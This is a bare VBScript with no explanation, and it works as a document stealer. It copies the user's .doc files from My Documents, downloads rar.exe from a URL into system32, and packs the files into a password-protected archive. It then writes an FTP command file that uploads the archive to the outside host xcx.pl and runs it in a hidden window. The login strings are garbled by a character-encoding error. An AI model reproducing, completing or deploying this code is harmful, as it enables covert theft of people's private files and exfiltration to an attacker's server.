Set ObjFSO = CreateObject("Scripting.FileSystemObject")
Set wshshell = Wscript.CreateObject("Wscript.Shell")
osdir = Wshshell.ExpandEnvironmentStrings("%systemroot%")
strMyDocumente = WshShell.SpecialFolders("MyDocuments")
Set f = Objfso.GetFolder(osdir)

If Not ( Objfso.FolderExists(f&"\ftp.txt")) Then
    Set thisfile = ObjFSO.OpenTextFile(f&"\ftp.txt", 2, True, 0)
    thisfile.Write("open xcx.pl 21"&vbCrLf&"”√ªß√˚"&vbCrLf&"√‹¬Î"&vbCrLf&"put "&f&"\temp\"&Date&".rar"&vbCrLf&"bye"&vbCrLf)
    thisfile.Close
End If

If Not ( Objfso.FolderExists(f&"\"&Date)) Then
    
    Set objFolder = objFSO.CreateFolder(f&"\"&Date)
End If


If ( Objfso.FolderExists(objFolder)) Then
    
    objFSO.CopyFile strMyDocumente&"\*.doc", objFolder , True
End If

If Not Objfso.FileExists(f&"\system32\rar.exe") Then
    
    Set x = CreateObject("Microsoft.XMLHTTP")
    x.Open "GET", "http://url/rar.exe", 0
    x.Send()
    Set s = CreateObject("ADODB.Stream")
    With s
        .Type = 1
        .Open()
        .Write(x.responseBody)
        .SaveToFile f&"\system32\rar.exe" , 2
    End With
    WScript.Sleep 72000
End If
If Objfso.FileExists(f&"\system32\rar.exe") Then
    wshshell.run "cmd /c rar.exe a -hp[√‹¬Î] "&f&"\temp\"&Date&".rar " &f&"\"&Date&"\*.doc" , 0
    wscript.sleep 72000
    wshshell.run "cmd /c ftp -s:"&f&"\ftp.txt", 0
End If
